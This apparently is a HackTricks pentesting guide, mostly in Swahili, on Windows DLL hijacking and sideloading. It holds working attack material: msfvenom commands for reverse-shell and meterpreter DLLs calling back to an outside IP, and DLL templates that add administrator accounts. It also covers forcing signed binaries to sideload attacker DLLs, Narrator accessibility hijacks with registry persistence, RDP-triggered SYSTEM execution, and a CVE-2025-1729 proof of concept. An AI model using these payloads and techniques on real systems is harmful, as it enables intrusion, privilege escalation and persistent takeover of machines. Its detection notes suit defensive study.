# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kumfanya programu inayotamkwa kuaminika ili ianze kuingiza DLL hatarishi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa hasa kwa ajili ya code execution, achieving persistence, na, mara chache, privilege escalation. Licha ya mwelekeo wa kupata escalation hapa, njia ya hijacking inabaki ile ile kwa malengo tofauti.

### Mbinu za Kawaida

Kuna njia kadhaa zinazotumika kwa DLL hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halali na moja hatarishi, kwa hiari kutumia DLL Proxying ili kuhifadhi kazi ya awali ya DLL.
2. **DLL Search Order Hijacking**: Kuweka DLL hatarishi katika njia ya utafutaji kabla ya ile halali, ukitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hatarishi ambayo programu itaenda kuipakia ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama %PATH% au faili .exe.manifest / .exe.local ili kuelekeza programu kwenye DLL hatarishi.
5. **WinSxS DLL Replacement**: Kuweka DLL halali kwa mfano hatarishi katika saraka ya WinSxS, mbinu inayohusiana mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hatarishi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyokopishwa, ikifanana na Binary Proxy Execution techniques.

## Kupata Dll zilizokosekana

Njia ya kawaida ya kupata Dll zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kutaka** **masaafu 2 zifuatazo**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na onyesha tu **File System Activity**:

![](<../../../images/image (153).png>)

Kama unatafuta **dll zilizokosekana kwa ujumla** unaweza kuiacha hii ikifanya kazi kwa **sekunde chache**.\
Kama unatafuta **dll iliyokosekana ndani ya executable maalum** unapaswa kuweka **filter nyingine kama "Process Name" "contains" `<exec name>`, itekeleze, na uache kurekodi matukio**.

## Kutumia Dll Zilizokosekana

Ili kupandisha vibali, nafasi yetu bora ni kuwa tunaweza **kuandika dll ambayo process ya privilege itajaribu kuipakia** katika baadhi ya **mahali ambapo itatafutwa**. Kwa hiyo, tutakuwa na uwezo wa **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll halali** iko (hali isiyo ya kawaida), au tutakuwa na uwezo wa **kuandika kwenye folda fulani ambapo dll itatafutwa** na dll halali haipo katika folda yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi Dll zinavyopakiwa kwa undani.**

Programu za Windows zinatafuta DLL kwa kufuata seti ya njia za utafutaji zilizowekwa kabla, zikifuata mfuatano maalum. Tatizo la DLL hijacking linatokea wakati DLL hatarishi imewekwa kimkakati katika moja ya saraka hizi, kuhakikisha inapakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia kamili (absolute paths) wakati ikirejea DLL zinazohitaji.

Unaweza kuona **DLL search order kwenye mifumo ya 32-bit** hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Huo ndio mfuatano wa utafutaji wa **default** ukiwa na **SafeDllSearchMode** imewezeshwa. Wakati imezuiliwa, current directory inainuka hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kwenye 0 (default ni enabled).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji unaanza katika saraka ya executable module ambayo **LoadLibraryEx** inapakia.

Mwisho, kumbuka kwamba **dll inaweza kupakiwa ikielezwa njia kamili badala ya jina tu**. Katika huo kesi dll hiyo **itaangaliwa tu katika njia hiyo** (ikiwa dll ina dependencies, zitatafuta kama zilivyozimwa kwa jina).

Kuna njia nyingine za kubadilisha mfuatano wa utafutaji lakini sitazielezea hapa.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu ya kuathiri kwa uhakika njia ya utafutaji wa DLL ya process mpya iliyoundwa ni kuweka uwanja DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa native APIs za ntdll. Kwa kutoa saraka inayodhibitiwa na mshambuliaji hapa, process lengwa inayesuluhisha DLL iliyoingizwa kwa jina (bila njia kamili na isiyotumia safe loading flags) inaweza kulazimishwa kupakia DLL hatarishi kutoka saraka hiyo.

Wazo kuu
- Jenga process parameters kwa kutumia RtlCreateProcessParametersEx na utoe DllPath maalum unaoelekeza kwenye folda yako inayodhibitiwa (mfano, saraka ambayo dropper/unpacker yako inakaa).
- Unda process kwa RtlCreateUserProcess. Wakati binary lengwa itaposuluhisha DLL kwa jina, loader itashauri DllPath iliyotolewa wakati wa utatuzi, kuwezesha sideloading inayotegemewa hata wakati DLL hatarishi haiko pamoja na EXE lengwa.

Vidokezo/maana
- Hii inaathiri process mtoto inayoendekwa; ni tofauti na SetDllDirectory, ambayo inaathiri process ya sasa pekee.
- Lengo lazima liingize au liite LoadLibrary kwa DLL kwa jina (bila njia kamili na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na njia za absolute zilizowekwa bila mabadiliko haiwezi kuibiwa. Forwarded exports na SxS zinaweza kubadilisha rangi ya kipaumbele.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Mfano kamili wa C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll ya kibaya (inayoexport kazi zinazohitajika au ikitumia proxy kwa ile halisi) kwenye saraka yako ya DllPath.
- Anzisha binary iliyotiwa saini inayojulikana kutafuta xmllite.dll kwa jina ukitumia mbinu hapo juu. loader inatatua import kupitia DllPath uliyopewa na inafanya sideload ya DLL yako.

Teknolojia hii imeonekana katika mazingira halisi kuendesha mnyororo wa sideloading wa hatua nyingi: mzinduzi wa awali hutoa helper DLL, ambayo kisha huanzisha binary iliyotiwa saini na Microsoft, inayoweza kuibiwa (hijackable) na yenye DllPath iliyobinafsishwa ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwa saraka ya staging.


#### Isivyo vya kawaida kwenye mpangilio wa utafutaji wa dll kutoka kwa nyaraka za Windows

Mambo fulani yanayotofautiana na mpangilio wa kawaida wa utafutaji wa DLL yameelezwa katika nyaraka za Windows:

- Wakati **DLL that shares its name with one already loaded in memory** inapotokezwa, mfumo unaruka utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwa DLL iliyopo kwenye kumbukumbu. **Katika tukio hili, mfumo haufanyi utafutaji wa DLL**.
- Katika matukio ambapo DLL inatambuliwa kama **known DLL** kwa toleo la Windows linalotumika, mfumo utatumia toleo lake la known DLL, pamoja na DLL yoyote inayotegemea, **akikataa mchakato wa utafutaji**. Ufunguo wa rejista **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** unaorodha ya known DLLs hizi.
- Iwapo **DLL ina utegemezi**, utafutaji wa DLL hizi tegemezi hufanywa kana kwamba zilielezewa kwa jina tu la **module names**, bila kujali kama DLL ya awali ilitambuliwa kupitia njia kamili.

### Escalating Privileges

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **idhini tofauti** (horizontal or lateral movement), ambao **isiyokuwa na DLL**.
- Hakikisha **ufikiaji wa kuandika** unapatikana kwa yoyote **directory** ambamo **DLL** itatafutwa. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya system path.

Naam, vigezo ni vigumu kuyapata kwa sababu kwa kawaida ni adimu kupata executable iliyo na idhini kubwa bila dll na ni hata adimu zaidi kuwa na ruhusa za kuandika kwenye saraka ya system path (kwa chaguo-msingi huwezi). Lakini, katika mazingira yaliyokosewa kusanidi hili hilo linawezekana.\
Iwapo utakuwa na bahati na ukajikuta unakidhi mahitaji, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni bypass UAC**, unaweza kupata hapo **PoC** ya Dll hijaking kwa toleo la Windows unaloweza kutumia (labda kwa kubadilisha tu njia ya saraka ambapo una ruhusa za kuandika).

Kumbuka kuwa unaweza **kuangalia ruhusa zako katika saraka** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports ya executable na exports ya dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili wa jinsi ya **abuse Dll Hijacking to escalate privileges** na ruhusa za kuandika katika **System Path folder** angalia:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itakagua kama una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Vifaa vingine vya kuvutia vya kiotomatiki vya kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Mfano

Iwapo utapata tukio linaloweza kutumiwa, moja ya mambo muhimu ili kulitumia kwa mafanikio ni **create a dll that exports at least all the functions the executable will import from it**. Hata hivyo, kumbuka kwamba Dll Hijacking inaweza kuwa muhimu ili [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Unaweza kupata mfano wa **how to create a valid dll** ndani ya utafiti huu wa dll hijacking uliolenga dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Zaidi ya hayo, katika sehemu inayofuata unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kuunda **dll with non required functions exported**.

## **Kuunda na kukusanya Dlls**

### **Dll Proxifying**

Kwa msingi, **Dll proxy** ni Dll inayoweza **execute your malicious code when loaded** lakini pia **expose** na **work** kama inavyotarajiwa kwa **relaying all the calls to the real library**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **indicate an executable and select the library** unayotaka proxify na **generate a proxified dll** au **indicate the Dll** na **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Tengeneza mtumiaji (x86 sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika visa kadhaa Dll ambayo unatengeneza lazima **export several functions** ambazo zitakazopakiwa na mchakato wa mwathiriwa; ikiwa functions hizi hazipo, **binary won't be able to load** nao na **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa C++ DLL na uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL ya C mbadala yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Somo la Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado huchunguza DLL ya localization inayotabirika, maalum kwa lugha, wakati wa kuanza ambayo inaweza kufanywa hijack kwa arbitrary code execution na persistence.

Mambo muhimu
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. Hakuna exports zinazohitajika.

Discovery with Procmon
- Kichujio: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na utazame jaribio la kupakia njia iliyo hapo juu.

DLL Ndogo
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Kimya ya OPSEC
- Hijack isiyo makini itasababisha kuzungumza/kutoa mwangaza kwa UI. Ili kubaki kimya, on attach orodhesha threads za Narrator, fungua main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` ile; endelea katika thread yako mwenyewe. Angalia PoC kwa msimbo kamili.

Trigger and persistence via Accessibility configuration
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa hayo hapo juu, kuanzisha Narrator itapakia DLL iliyowekwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwa host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itaendesha kama SYSTEM kwenye secure desktop.
- Utekelezaji unaacha pale kikao cha RDP kinapofungwa — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Unaweza ku-clone entry ya rejista ya built-in Accessibility Tool (AT) (mfano, CursorIndicator), uibadilishe ili iielekeze kwa binary/DLL yoyote, ui-import, kisha weka `configuration` kwa jina hilo la AT. Hii inaruhusu utekelezaji wowote kupitia mfumo wa Accessibility.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwekwa katika `DLL_PROCESS_ATTACH`; hakuna exports zinahitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Mfano huu unaonyesha **Phantom DLL Hijacking** katika Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), inafuatiliwa kama **CVE-2025-1729**.

### Vulnerability Details

- **Komponenti**: `TPQMAssistant.exe` iliyoko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Kazi Iliyopangwa**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inaendesha kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Directory**: Inaweza kuandikwa na `CREATOR OWNER`, kuruhusu watumiaji wa ndani kuweka faili yoyote.
- **Tabia ya Utafutaji wa DLL**: Inajaribu kupakia `hostfxr.dll` kutoka kwenye directory yake ya kazi kwanza na inaandika log "NAME NOT FOUND" ikiwa haipo, ikionyesha upendeleo wa utafutaji wa directory ya ndani.

### Exploit Implementation

Mtukutu anaweza kuweka stub ya `hostfxr.dll` yenye madhara katika directory ileile, akitumia DLL isiyokuwepo kufanikisha utekelezaji wa msimbo chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ianze kuendeshwa saa 9:30 AM kwa muktadha wa mtumiaji wa sasa.
3. Ikiwa administrator ameingia wakati kazi inatekelezwa, DLL ya hatari itaendeshwa katika kikao cha administrator kwa medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi idhinisho za SYSTEM.

## Kesi ya Uchunguzi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Wadukuzi mara nyingi huunganisha dropper za MSI na DLL side-loading ili kutekeleza payload chini ya mchakato uliothibitishwa na uliosainiwa.

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction inaendesha kimya wakati wa GUI install (mfano, LaunchApplication au hatua ya VBScript), ikijenga upya hatua inayofuata kutoka kwa embedded resources.
- Dropper inaandika EXE halali iliyosainiwa na DLL ya hatari kwenye saraka hiyo hiyo (mfano: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Mara EXE iliyosainiwa inaanzishwa, Windows DLL search order inaleta wsc.dll kutoka kwa working directory kwanza, ikitekeleza msimbo wa mshambuliaji chini ya mzazi uliosainiwa (ATT&CK T1574.001).

Uchambuzi wa MSI (vitu vya kuangalia)
- Jedwali la CustomAction:
- Tafuta rekodi zinazoendesha executables au VBScript. Mfano wa muundo unaoshukiwa: LaunchApplication ikitekeleza faili iliyojazwa kwa background.
- Katika Orca (Microsoft Orca.exe), angalia jedwali la CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizo embedded/zimetengenezwa ndani ya MSI CAB:
- Uchimbaji wa kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta vipande vidogo vingi vinavyounganishwa na kufunguliwa (decrypted) na CustomAction ya VBScript. Mtiririko wa kawaida:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading ya vitendo na wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
- wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato unajaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
- wsc.dll: attacker DLL. Ikiwa hakuna exports maalum zinazohitajika, DllMain inatosha; vinginevyo, jenga proxy DLL na pitisha exports zinazohitajika kwenda kwa maktaba halisi wakati wa kuendesha payload ndani ya DllMain.
- Jenga DLL payload ndogo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia proxying framework (e.g., DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia inatekeleza payload yako.

- Mbinu hii inategemea DLL name resolution na host binary. Ikiwa host inatumia absolute paths au safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, and forwarded exports zinaweza kuathiri precedence na zinapaswa kuzingatiwa wakati wa uchaguzi wa host binary na export set.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
